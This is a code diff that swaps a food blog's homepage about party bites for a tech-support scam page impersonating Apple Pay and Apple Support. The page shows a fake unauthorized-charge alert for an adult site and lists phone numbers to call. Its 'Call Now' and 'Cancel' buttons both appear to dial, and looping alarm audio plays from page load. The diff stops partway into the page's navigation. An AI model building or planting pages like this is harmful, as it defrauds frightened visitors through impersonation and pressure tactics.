@@ -1,63 +1,971 @@
-<!DOCTYPE html>
-<html lang="en">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Morsels | Bite-Sized Food, Party Bite Calculator &amp; Make-Ahead Plan</title>
-<meta name="description" content="Morsels is an independent guide to bite-sized food, with a party bite calculator, a make-ahead timeline and guides to canapes, crostini and party bites.">
-<meta name="robots" content="index, follow, max-image-preview:large">
-<link rel="canonical" href="https://morsels.com/">
-<meta property="og:type" content="website"><meta property="og:site_name" content="Morsels">
-<meta property="og:title" content="Morsels | Bite-Sized Food, Party Bite Calculator &amp; Make-Ahead Plan"><meta property="og:description" content="Morsels is an independent guide to bite-sized food, with a party bite calculator, a make-ahead timeline and guides to canapes, crostini and party bites.">
-<meta property="og:url" content="https://morsels.com/"><meta property="og:image" content="https://images.unsplash.com/photo-1784019841674-8b029cc79d1e?auto=format&fit=crop&w=1200&q=75">
-<meta name="twitter:card" content="summary_large_image"><meta name="theme-color" content="#0F3D3E">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Ccircle cx='20' cy='20' r='19' fill='%230F3D3E'/%3E%3Ccircle cx='20' cy='20' r='12' fill='%23FBF8F2'/%3E%3Ccircle cx='20' cy='20' r='6' fill='%23FF7A59'/%3E%3C/svg%3E">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://images.unsplash.com">
-<link href="https://fonts.googleapis.com/css2?family=Krona+One&family=Glegoo:wght@400;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/style.css">
-<script>document.documentElement.classList.add("js")</script>
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "Organization", "name": "Morsels", "url": "https://morsels.com", "email": "hello@morsels.com", "telephone": "+1-888-777-5845", "address": {"@type": "PostalAddress", "streetAddress": "181 Mercer Street", "addressLocality": "New York", "addressRegion": "NY", "postalCode": "10012", "addressCountry": "US"}}, {"@type": "WebSite", "name": "Morsels", "url": "https://morsels.com"}]}</script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+
+    <title>Contact - Support</title>
+
+    <link rel="stylesheet" href="css/kTa00i9n5NV8.html" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253Dsf%20pro%252Cv1_7csf%20pro%20icons%252Cv1html.html">
+ <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-2DMKRPGVF0');
+</script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 </head>
-<body class="">
-<a class="skip" href="#main">Skip to content</a><div id="prog" aria-hidden="true"></div>
-<header class="ms2-hd"><div class="ms2-w ms2-hd-in"><a class="logo" href="./" aria-label="Morsels home"><svg viewBox="0 0 40 40" aria-hidden="true"><circle cx="20" cy="20" r="18" fill="#0F3D3E"/><circle cx="20" cy="20" r="12" fill="#FBF8F2"/><circle cx="20" cy="20" r="6" fill="#FF7A59"/><path d="M30 6l-6 10" stroke="#F6E27F" stroke-width="2.6" stroke-linecap="round"/></svg><span>Morsels</span></a><nav id="nav" aria-label="Main navigation"><ul><li><a href="./" aria-current="page">The Pass</a></li><li><a href="bite-size-basics-guide.html">Bite-Size Basics</a></li><li><a href="party-bites-guide.html">Party Bites</a></li><li><a href="about.html">About</a></li><li><a href="contact.html">Contact</a></li></ul></nav><a class="ms2-hd-c" href="./#count">Count my bites</a><button class="burger" aria-label="Open menu" aria-expanded="false" aria-controls="nav"><i></i><i></i></button></div></header>
-<main id="main">
 
-<section class="ms2-hero"><div class="ms2-w ms2-hero-g"><div class="ms2-hero-t"><p class="ms2-ey">Bite-sized food for home cooks</p><h1><span>Mor</span><span>sels</span></h1><p class="ms2-lead">The little things that disappear first. Canap&eacute;s, crostini and party bites, with quantities that add up and a plan that keeps the host relaxed.</p><div class="ms2-hero-a"><a class="ms2-btn" href="#count">Plan my party bites</a><a class="ms2-lnk" href="bite-size-basics-guide.html">Start with the basics</a></div></div>
-<div class="ms2-plate"><div class="ms2-orbit" aria-hidden="true"><span style="--a:0deg">Crostini</span><span style="--a:60deg">Skewers</span><span style="--a:120deg">Tartlets</span><span style="--a:180deg">Blinis</span><span style="--a:240deg">Fritters</span><span style="--a:300deg">Cups</span></div><div class="ms2-plate-r"><div class="ms2-plate-i"><img src="https://images.unsplash.com/photo-1784019841674-8b029cc79d1e?auto=format&fit=crop&w=620&h=620&q=75" alt="a tray of assorted canapes" width="620" height="620" fetchpriority="high"></div></div><svg class="ms2-pk" viewBox="0 0 20 80" aria-hidden="true"><path d="M10 14v64" /><circle cx="10" cy="9" r="7"/></svg></div></div>
-<div class="ms2-belt-w"><div class="ms2-belt-h"><span>On the pass now</span><em>Drag to browse</em></div><div class="hs ms2-belt" id="belt"><figure class="ms2-bp"><div class="ms2-bp-p"><img src="https://images.unsplash.com/photo-1527751171053-6ac5ec50000b?auto=format&fit=crop&w=320&h=320&q=75" alt="small dessert bites on a platter" width="320" height="320" loading="lazy"></div><figcaption>Sweet bites</figcaption></figure><figure class="ms2-bp"><div class="ms2-bp-p"><img src="https://images.unsplash.com/photo-1703113690278-35a47db83deb?auto=format&fit=crop&w=320&h=320&q=75" alt="small glass cups filled with appetisers" width="320" height="320" loading="lazy"></div><figcaption>Little cups</figcaption></figure><figure class="ms2-bp"><div class="ms2-bp-p"><img src="https://images.unsplash.com/photo-1776267074144-f6bf70187b85?auto=format&fit=crop&w=320&h=320&q=75" alt="assorted bite-sized snacks" width="320" height="320" loading="lazy"></div><figcaption>Snack board</figcaption></figure><figure class="ms2-bp"><div class="ms2-bp-p"><img src="https://images.unsplash.com/photo-1548340748-6d2b7d7da280?auto=format&fit=crop&w=320&h=320&q=75" alt="crispy fried bites held up" width="320" height="320" loading="lazy"></div><figcaption>Fritters</figcaption></figure><figure class="ms2-bp"><div class="ms2-bp-p"><img src="https://images.unsplash.com/photo-1772198537619-eb15218b08c3?auto=format&fit=crop&w=320&h=320&q=75" alt="small savoury bites on a tray" width="320" height="320" loading="lazy"></div><figcaption>Savoury tray</figcaption></figure><figure class="ms2-bp"><div class="ms2-bp-p"><img src="https://images.unsplash.com/photo-1674422753234-f2e1ce087e3a?auto=format&fit=crop&w=320&h=320&q=75" alt="bruschetta topped with tomato and herbs" width="320" height="320" loading="lazy"></div><figcaption>Bruschetta</figcaption></figure><figure class="ms2-bp"><div class="ms2-bp-p"><img src="https://images.unsplash.com/photo-1574862612978-33bdb5f6a334?auto=format&fit=crop&w=320&h=320&q=75" alt="small toasts topped with tomatoes" width="320" height="320" loading="lazy"></div><figcaption>Crostini</figcaption></figure><figure class="ms2-bp"><div class="ms2-bp-p"><img src="https://images.unsplash.com/photo-1607374739836-e594a445c7f6?auto=format&fit=crop&w=320&h=320&q=75" alt="tapas dishes on a table" width="320" height="320" loading="lazy"></div><figcaption>Small plates</figcaption></figure></div><div class="ms2-rail" aria-hidden="true"></div></div></section>
+<script>
+ 
+  window.SUPPORT_PHONE = {
+    display: "+1(888) 901-1933",   
+    tel:     "+18889011933"        
+  };
+</script>
 
-<section class="ms2-s ms2-ct2" id="count"><div class="ms2-w ms2-ct2-g"><div><p class="ms2-ey">Tool one</p><h2 class="rv">Party bite calculator</h2><p class="ms2-p">How many bites do you really need? Tell us about your party and we will work out the total, how many kinds to make and how many of each.</p>
-<label class="ms2-lb" for="ct-g">Guests <output id="ct-go">16</output></label><input type="range" id="ct-g" min="4" max="60" value="16">
-<fieldset><legend>The occasion</legend><div class="ms2-chips" id="ct-o"><button type="button" data-v="0">Before dinner</button><button type="button" data-v="1" class="on">Drinks party</button><button type="button" data-v="2">Instead of dinner</button></div></fieldset>
-<label class="ms2-lb" for="ct-h">How long <output id="ct-ho">2 hours</output></label><input type="range" id="ct-h" min="1" max="5" step=".5" value="2"></div>
-<div class="ms2-tray"><div class="ms2-tray-h"><div><span>Total bites</span><b id="ct-t">0</b></div><div><span>Kinds</span><b id="ct-k">0</b></div><div><span>Of each</span><b id="ct-e">0</b></div></div><div class="ms2-dots" id="ct-d" aria-hidden="true"></div><ul class="ms2-mix" id="ct-m" aria-live="polite"></ul></div></div></section>
 
-<section class="ms2-s ms2-pl" id="plan"><div class="ms2-w ms2-pl-g"><div><p class="ms2-ey">Tool two</p><h2 class="rv">Make-ahead timeline</h2><p class="ms2-p">Most party food can be made in stages. Set the time your first guest arrives and we will build a prep schedule that saves the last hour for assembly, not panic.</p>
-<label class="ms2-lb" for="pl-t">Guests arrive at <output id="pl-to">7:00 pm</output></label><input type="range" id="pl-t" min="12" max="22" step=".5" value="19">
-<fieldset><legend>Warm bites too?</legend><div class="ms2-chips" id="pl-w"><button type="button" data-v="0">Cold only</button><button type="button" data-v="1" class="on">Some warm</button></div></fieldset></div>
-<ol class="ms2-tl" id="pl-l" aria-live="polite"></ol></div></section>
+<style>
 
-<section class="ms2-s ms2-an"><div class="ms2-w ms2-an-g"><div><p class="ms2-ey">Anatomy of a bite</p><h2 class="rv">Four layers, one perfect mouthful</h2><p class="ms2-p">Every great bite is a whole dish in miniature. Build from the bottom up, and aim for contrast: crisp with creamy, rich with sharp. Keep it to one or two neat bites, about 4 to 5 cm across.</p><a class="ms2-lnk" href="bite-size-basics-guide.html">Read Bite-Size Basics</a></div><ol class="ms2-stack"><li style="--c:#5E8A3A;--i:0"><i></i><div><b>Finish</b><p>Herbs, citrus zest, flaky salt or a drizzle of oil</p></div></li><li style="--c:#FF7A59;--i:1"><i></i><div><b>Topping</b><p>One bold star: smoked fish, roast vegetables, cured meat</p></div></li><li style="--c:#F6E27F;--i:2"><i></i><div><b>Spread</b><p>Cream cheese, hummus or butter: the glue that keeps it crisp</p></div></li><li style="--c:#D9A15B;--i:3"><i></i><div><b>Base</b><p>Crostini, cucumber, pastry or blini: sturdy enough to hold</p></div></li></ol></div></section>
 
-<section class="ms2-gd"><div class="ms2-w ms2-gd-g"><a class="ms2-board rv" href="bite-size-basics-guide.html"><span class="ms2-board-k">Today&rsquo;s special &middot; 01</span><b>Bite-Size Basics</b><em>Bases, spreads, toppings and the one-bite rule</em><i>Read the guide</i></a><a class="ms2-board ms2-board2 rv" href="party-bites-guide.html"><span class="ms2-board-k">Today&rsquo;s special &middot; 02</span><b>Party Bites Planning</b><em>Quantities, timing and serving in waves</em><i>Read the guide</i></a></div></section>
+.popup-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.55);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  z-index: 99999;
+}
 
-</main>
-<footer class="ms2-ft"><div class="ms2-w"><div class="ms2-ft-t"><div class="ms2-ft-plate" aria-hidden="true"><i></i></div><p>Pass it<br><em>around.</em></p></div><div class="ms2-ft-g"><div><a class="logo" href="./"><svg viewBox="0 0 40 40" aria-hidden="true"><circle cx="20" cy="20" r="18" fill="#0F3D3E"/><circle cx="20" cy="20" r="12" fill="#FBF8F2"/><circle cx="20" cy="20" r="6" fill="#FF7A59"/><path d="M30 6l-6 10" stroke="#F6E27F" stroke-width="2.6" stroke-linecap="round"/></svg><span>Morsels</span></a><p>An independent home-cooking guide to bite-sized food: canap&eacute;s, crostini and party bites, with honest quantities and make-ahead plans.</p></div><div><h4>Guides</h4><a href="bite-size-basics-guide.html">Bite-Size Basics</a><a href="party-bites-guide.html">Party Bites Planning</a><a href="./#count">Party bite calculator</a><a href="./#plan">Make-ahead timeline</a></div><div><h4>Morsels</h4><a href="about.html">About</a><a href="contact.html">Contact</a><a href="editorial-policy.html">Editorial Policy</a></div><div><h4>Legal</h4><a href="privacy-policy.html">Privacy Policy</a><a href="terms-and-conditions.html">Terms &amp; Conditions</a><a href="cookie-policy.html">Cookie Policy</a><a href="disclaimer.html">Disclaimer</a></div><div><h4>Contact</h4><p>181 Mercer Street, New York, NY 10012, United States</p><a href="tel:+18887775845">+1-888-777-5845</a><a href="mailto:hello@morsels.com">hello@morsels.com</a></div></div><p class="ms2-ft-c">&copy; <span id="year">2026</span> Morsels &middot; Small plates, full tables</p></div></footer>
-<div class="cookie" id="cookie" role="dialog" aria-label="Cookie notice"><p>We use essential storage and, with your consent, cookies for our live chat and any ads shown on the site. <a href="cookie-policy.html">Cookie Policy</a></p><button class="y" data-cookie="accepted">Accept</button><button data-cookie="declined">Essential only</button></div>
-<script src="assets/js/main.js" defer></script>
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/626be649b0d10b6f3e6ff291/1g1qnn49c';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
+.ps-popup {
+  width: 100%;
+  max-width: 430px;
+  background: #ffffff;
+  border-radius: 20px;
+  overflow: hidden;
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+  animation: popupIn 0.25s ease-out;
+  position: relative;
+}
+
+@keyframes popupIn {
+  from { opacity: 0; transform: translateY(15px) scale(0.97); }
+  to   { opacity: 1; transform: translateY(0)   scale(1);    }
+}
+
+.ps-popup .popup-header {
+  background: #ffffff;
+  padding: 24px 24px 18px;
+  border-bottom: 0.5px solid #e5e5ea;
+  text-align: center;
+}
+
+.ps-popup .brand-icon {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 14px;
+}
+
+.ps-popup .brand-icon img {
+  width: 140px;
+  height: auto;
+  display: block;
+  margin-top: -10px;
+  margin-bottom: -15px;
+}
+
+.ps-popup .popup-header h2 {
+  color: #222;
+  font-size: 21px;
+  margin-bottom: 5px;
+  text-align: center;
+}
+
+.ps-popup .popup-header p {
+  color: #666;
+  font-size: 15px;
+  text-align: center;
+}
+
+.ps-popup .popup-body {
+  padding: 22px 24px;
+}
+
+.ps-popup .popup-body > p {
+  font-size: 14px;
+  color: #333;
+  line-height: 1.5;
+  margin: 0 0 8px;
+}
+
+.ps-popup .transaction-box {
+  background: #f7f7f9;
+  border-radius: 13px;
+  padding: 16px;
+  margin: 16px 0;
+}
+
+.ps-popup .transaction-row {
+  display: flex;
+  justify-content: space-between;
+  gap: 15px;
+  padding: 8px 0;
+  font-size: 14px;
+}
+
+.ps-popup .transaction-row span:first-child {
+  color: #777;
+}
+
+.ps-popup .transaction-row span:last-child {
+  color: #222;
+  font-weight: 600;
+  text-align: right;
+}
+
+.ps-popup .amount {
+  color: #d92d20 !important;
+  font-size: 16px;
+}
+
+.ps-popup .status {
+  color: #16803c !important;
+}
+
+.ps-popup .notice {
+  background: #fff4f2;
+  border-left: 4px solid #e5484d;
+  padding: 12px;
+  border-radius: 7px;
+  color: #6b2525;
+  font-size: 15px;
+  line-height: 1.5;
+  margin-bottom: 18px;
+}
+
+.ps-popup .buttons {
+  display: flex;
+  gap: 10px;
+}
+
+.ps-popup button {
+  flex: 1;
+  border-radius: 11px;
+  padding: 13px 10px;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: 0.2s;
+}
+
+.ps-popup .primary-btn {
+  background: #000;
+  color: #fff;
+  border: none;
+}
+
+.ps-popup .primary-btn:hover {
+  background: #222;
+}
+
+.ps-popup .secondary-btn {
+  background: #fff;
+  color: #000;
+  border: 2px solid #000;
+}
+
+.ps-popup .secondary-btn:hover {
+  background: #f5f5f5;
+}
+
+.ps-popup .popup-footer {
+  padding: 0 24px 22px;
+  color: #888;
+  font-size: 11px;
+  line-height: 1.5;
+  text-align: center;
+}
+
+@media (max-width: 480px) {
+  .ps-popup { border-radius: 16px; }
+  .ps-popup .popup-body,
+  .ps-popup .popup-header { padding-left: 20px; padding-right: 20px; }
+}
+
+/* ===== EXISTING STYLES ===== */
+@media (min-width: 768px) {
+    .popup-content .btn-row {
+        display: flex;
+        gap: 12px;
+    }
+
+    .popup-content .btn-row button {
+    flex: 1;
+    margin: 0;
+    padding: 14px;
+    font-size: 16px;
+    border-radius: 8px;
+}
+}
+
+    .popup {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 140%;
+        background: rgba(0,0,0,0.6);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+
+.popup-content button {
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+.popup-content .btn-row button:first-child {
+    background: #000;
+    color: #fff;
+    border: none;
+}
+
+.popup-content .btn-row button:last-child {
+    background: #fff;
+    color: #000;
+    border: 2px solid #000;
+}
+
+.popup-content > button {
+    width: 100%;
+    margin-top: 12px;
+    background: #f5f5f5;
+    border: 2px solid #000;
+}
+
+.popup-content {
+    background: linear-gradient(135deg, #ffffff, #f2f2f2);
+    color: #000;
+    width: 420px;
+    max-width: 90%;
+    text-align: center;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    transform: translateY(-40%);
+}
+.popup-content p {
+    width: 100%;
+    text-align: left;
+    margin-bottom: 20px;
+}
+.popup-title {
+    width: 100%;
+    text-align: center;
+    font-size: 26px;
+    font-weight: 700;
+    margin-bottom: 20px;
+    color: #fff;
+    line-height: 1.4;
+}
+.popup-text {
+    width: 100%;
+    font-size: 18px;
+    font-weight: 500;
+    line-height: 1.5;
+    color: #000;
+    margin-bottom: 20px;
+}
+@import url('https://fonts.googleapis.com/css2?family=Manrope:wght@500;700&amp;display=swap');
+
+  .call-popup-wrapper {
+    position: fixed;
+    bottom: 50px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 99999;
+    font-family: 'Manrope', sans-serif;
+    opacity: 0;
+    animation: none;
+  }
+
+  .call-popup-btn {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: #111111;
+    color: #ffffff;
+    text-decoration: none;
+    padding: 32px 72px;
+    border-radius: 50px;
+    font-size: 32px;
+    font-weight: 700;
+    letter-spacing: 0.02em;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.35), 0 2px 8px rgba(0,0,0,0.18);
+    transition: transform 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
+    white-space: nowrap;
+    border: none;
+    cursor: pointer;
+  }
+
+  .call-popup-btn:hover {
+    background: #222222;
+    transform: translateX(-0%) translateY(-3px);
+    box-shadow: 0 16px 40px rgba(0, 0, 0, 0.4), 0 4px 12px rgba(0,0,0,0.2);
+  }
+
+  .call-popup-btn:active {
+    transform: translateX(-0%) translateY(0px);
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+  }
+
+  .call-icon-wrap {
+    position: relative;
+    width: 22px;
+    height: 22px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .call-icon-wrap::before {
+    content: '';
+    position: absolute;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.12);
+    animation: pulse 1.8s ease-out infinite;
+  }
+
+  .call-icon {
+    width: 18px;
+    height: 18px;
+    fill: #ffffff;
+    position: relative;
+    z-index: 1;
+  }
+
+  .call-label {
+    text-decoration: underline;
+    text-underline-offset: 3px;
+    text-decoration-thickness: 1.5px;
+    text-decoration-color: rgba(255,255,255,0.5);
+  }
+
+  @keyframes pulse {
+    0%   { transform: scale(0.8); opacity: 0.8; }
+    70%  { transform: scale(1.6); opacity: 0;   }
+    100% { transform: scale(0.8); opacity: 0;   }
+  }
+
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateX(-50%) translateY(24px); }
+    to   { opacity: 1; transform: translateX(-50%) translateY(0);    }
+  }
+
+  @media (max-width: 480px) {
+    .call-popup-btn {
+      padding: 22px 44px;
+      font-size: 22px;
+    }
+  }
+  .popup-heading {
+    display: block;
+    font-size: 20px;
+    font-weight: 700;
+    margin-bottom: 8px;
+}
+
+.popup-subtext {
+    font-size: 18px;
+    font-weight: 700;
+    line-height: 1.6;
+    margin: 0;
+    text-align: right;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      width: 100%;
+      min-height: 100dvh;
+      overflow-x: hidden;
+      overflow-y: auto;
+      background: #f5f5f7;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
+      touch-action: pan-x pan-y;
+    }
+
+    .apple-nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      height: 52px;
+      background: rgba(245,245,247,0.92);
+      backdrop-filter: saturate(180%) blur(20px);
+      -webkit-backdrop-filter: saturate(180%) blur(20px);
+      border-bottom: 0.5px solid #d2d2d7;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 clamp(1rem, 5vw, 1.5rem);
+      z-index: 100;
+    }
+    .nav-left { display: flex; align-items: center; gap: 8px; }
+    .nav-title { font-size: 17px; font-weight: 600; color: #1d1d1f; letter-spacing: -0.3px; }
+
+    .nav-cart {
+      display: flex; align-items: center; justify-content: center;
+      width: 38px; height: 38px;
+      border-radius: 50%;
+      cursor: pointer;
+      position: relative;
+      -webkit-tap-highlight-color: transparent;
+      transition: background 0.15s;
+    }
+    .nav-cart:active { background: #e5e5ea; }
+    .cart-badge {
+      position: absolute;
+      top: 1px; right: 1px;
+      width: 17px; height: 17px;
+      background: #0071e3;
+      border-radius: 50%;
+      font-size: 10px; font-weight: 700;
+      color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      border: 1.5px solid #f5f5f7;
+    }
+
+    #processing {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 100dvh;
+      padding-top: 52px;
+      background: #f5f5f7;
+      text-align: center;
+      padding-left: 1rem;
+      padding-right: 1rem;
+    }
+
+    #confirmed {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      width: 100%;
+      min-height: 100dvh;
+      padding-top: 68px;
+      padding-bottom: max(env(safe-area-inset-bottom, 16px), 20px);
+      padding-left: clamp(12px, 4vw, 20px);
+      padding-right: clamp(12px, 4vw, 20px);
+      gap: 0;
+      overflow: visible;
+    }
+
+    canvas#confetti {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none; z-index: 98;
+    }
+
+    .spinner {
+      width: 38px; height: 38px;
+      border: 2.5px solid #d2d2d7;
+      border-top: 2.5px solid #1d1d1f;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+      margin-top: 1.25rem;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .check-ring {
+      width: clamp(44px, 12vw, 60px);
+      height: clamp(44px, 12vw, 60px);
+      border-radius: 50%; background: #34c759;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto clamp(4px, 1.2vh, 8px);
+      animation: popIn 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      flex-shrink: 0;
+    }
+    @keyframes popIn { from { transform: scale(0.3); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 420px;
+      padding: clamp(10px, 2.2vh, 18px) clamp(14px, 4vw, 20px);
+      margin-bottom: clamp(6px, 1.4vh, 10px);
+      flex-shrink: 0;
+    }
+
+    .divider {
+      height: 0.5px;
+      background: #e5e5ea;
+      margin: clamp(6px, 1.4vh, 10px) 0;
+      width: 100%;
+    }
+
+    .progress-wrap {
+      display: flex; align-items: flex-start;
+      justify-content: center; width: 100%;
+    }
+    .step { display: flex; flex-direction: column; align-items: center; gap: 4px; flex: 1; }
+    .dot {
+      width: clamp(22px, 6vw, 28px);
+      height: clamp(22px, 6vw, 28px);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-size: clamp(9px, 2.5vw, 11px); font-weight: 600;
+      position: relative; z-index: 1; flex-shrink: 0;
+    }
+    .dot.done  { background: #1d1d1f; color: #fff; }
+    .dot.active{ background: #0071e3; color: #fff; }
+    .dot.pending{ background: #e5e5ea; color: #aeaeb2; }
+    .step-line {
+      flex: 1; height: 2px;
+      margin-top: clamp(10px, 2.8vw, 13px);
+      z-index: 0;
+    }
+    .step-line.done   { background: #1d1d1f; }
+    .step-line.pending{ background: #e5e5ea; }
+    .step-lbl {
+      font-size: clamp(9px, 2.4vw, 11px);
+      text-align: center; letter-spacing: -0.1px;
+    }
+    .step-lbl.done   { color: #1d1d1f; font-weight: 500; }
+    .step-lbl.active { color: #0071e3; font-weight: 500; }
+    .step-lbl.pending{ color: #aeaeb2; }
+
+    .order-row {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: clamp(5px, 1.2vh, 8px) 0;
+    }
+    .order-row + .order-row { border-top: 0.5px solid #e5e5ea; }
+
+    .alert-card {
+      background: #fff9ec;
+      border-radius: 14px;
+      padding: clamp(8px, 1.8vh, 14px) clamp(12px, 4vw, 16px);
+      width: 100%; max-width: 420px;
+      flex-shrink: 0;
+    }
+
+    .btn-call {
+      display: block; width: 100%;
+      padding: clamp(10px, 2.4vh, 14px);
+      background: #0071e3; color: #fff;
+      border: none; border-radius: 12px;
+      font-size: clamp(13px, 3.8vw, 15px); font-weight: 500;
+      cursor: pointer; text-decoration: none; text-align: center;
+      margin-top: 8px;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      letter-spacing: -0.2px; -webkit-tap-highlight-color: transparent;
+    }
+    .btn-call:active { background: #0062c3; }
+
+    .btn-ignore {
+      display: block; width: 100%;
+      padding: clamp(10px, 2.4vh, 14px);
+      background: #fff; color: #1d1d1f;
+      border: 0.5px solid #d2d2d7; border-radius: 12px;
+      font-size: clamp(13px, 3.8vw, 15px); font-weight: 400;
+      cursor: pointer; text-align: center;
+      margin-top: 6px;
+      text-decoration: none;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      letter-spacing: -0.2px; -webkit-tap-highlight-color: transparent;
+    }
+    .btn-ignore:active { background: #f2f2f7; }
+
+    .sub-text {
+      width: 100%; max-width: 420px;
+      text-align: center;
+      font-size: clamp(11px, 3vw, 13px);
+      color: #6e6e73;
+      line-height: 1.55;
+      margin-bottom: clamp(4px, 1vh, 8px);
+      flex-shrink: 0;
+    }
+
+    .card-header {
+      display: flex; flex-direction: column;
+      align-items: center; text-align: center;
+      margin-bottom: clamp(6px, 1.4vh, 10px);
+    }
+    </style>
+
+<body>
+<audio id="audioDue">
+    <source src="due83.wav" type="audio/wav">
+</audio>
+
+<audio id="myAudio" loop>
+    <source src="auf7u4.wav" type="audio/wav">
+</audio>
+
+<script>
+const audio = document.getElementById("myAudio");
+const due   = document.getElementById("audioDue");
+
+// Gap between each due83.wav play (milliseconds)
+const DUE_TO_DUE_GAP = 17000;   // 17s
+
+let dueLoopRunning = false;
+
+// Play main looping audio + start due loop on load
+window.addEventListener("load", () => {
+    audio.play().catch(() => {
+        console.log("Autoplay blocked until user interaction");
+    });
+    startDueLoop();
+});
+
+// Simple, restartable loop using setTimeout
+function startDueLoop() {
+    if (dueLoopRunning) return;
+    dueLoopRunning = true;
+    playDue();
+}
+
+function playDue() {
+    try { due.currentTime = 0; } catch (e) {}
+    due.play().catch(() => {});
+
+    due.onended = () => {
+        setTimeout(playDue, DUE_TO_DUE_GAP);
+    };
+}
+
+// Fallback: if autoplay was blocked, kick off on first user click
+document.addEventListener("click", () => {
+    audio.play().catch(() => {});
+    startDueLoop();
+}, { once: true });
+</script>
+
+<!-- ============ NEW POPUP ============ -->
+<div class="popup-overlay" id="paymentPopup">
+
+    <div class="ps-popup" role="dialog" aria-modal="true">
+
+      <div class="popup-header">
+        <div class="brand-icon">
+          <img src="3553gg3h.png" alt="Apple Pay">
+        </div>
+
+        <h2>Payment Security Alert</h2>
+        <p>Unusual transaction detected</p>
+      </div>
+
+      <div class="popup-body">
+
+        <p>
+          A potentially unauthorized payment was reported
+          in connection with this payment account.
+        </p>
+
+        <div class="transaction-box">
+
+          <div class="transaction-row">
+            <span>Merchant</span>
+            <span>PornHub</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Payment Method</span>
+            <span>Apple Pay</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Amount</span>
+            <span class="amount">$399.99</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Transaction ID</span>
+            <span>APX-728491</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Status</span>
+            <span class="status">Completed</span>
+          </div>
+
+        </div>
+
+        <div class="notice">
+          <strong>Important:</strong>
+          <span>If You believe this transaction is unauthorized,</span>
+          <span>Please contact Apple Support at <strong data-phone-display>+1(855) 397-2122</strong></span>
+        </div>
+
+        <div class="buttons">
+          <button class="primary-btn" data-phone-tel>
+            Call Now
+          </button>
+
+          <button class="secondary-btn" data-phone-tel>
+            Cancel
+          </button>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+<!-- ============ END NEW POPUP ============ -->
+
+<nav class="apple-nav" data-phone-tel style="cursor:pointer;">
